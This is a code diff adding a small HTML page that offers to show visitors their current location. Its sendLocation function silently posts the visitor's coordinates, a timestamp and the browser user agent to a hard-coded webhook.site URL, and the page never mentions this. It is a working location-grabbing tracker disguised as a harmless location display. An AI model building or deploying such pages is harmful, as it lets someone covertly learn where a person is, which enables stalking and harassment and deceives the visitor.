@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Access</title>
+</head>
+<body>
+  <h2>🌍 Click the button to get your current location</h2>
+  <button onclick="getLocation()">📍 Share Location</button>
+  <p id="status"></p>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+        document.getElementById("status").innerText = "📡 Requesting location...";
+      } else {
+        document.getElementById("status").innerText = "Geolocation is not supported by this browser.";
+      }
+    }
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const timestamp = new Date().toISOString();
+
+      document.getElementById("status").innerText =
+        `✅ Location received: ${latitude}, ${longitude}`;
+
+      // Send data to your webhook
+      fetch("https://webhook.site/1c1a3c52-ffb5-4118-b95b-44eb03311cc0", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          latitude,
+          longitude,
+          timestamp,
+          userAgent: navigator.userAgent
+        })
+      });
+    }
+
+    function showError(error) {
+      const errors = {
+        1: "❌ Permission denied.",
+        2: "📡 Position unavailable.",
+        3: "⌛ Timeout.",
+      };
+      document.getElementById("status").innerText =
+        errors[error.code] || "❗ Unknown error.";
+    }
+  </script>
+</body>
+</html>
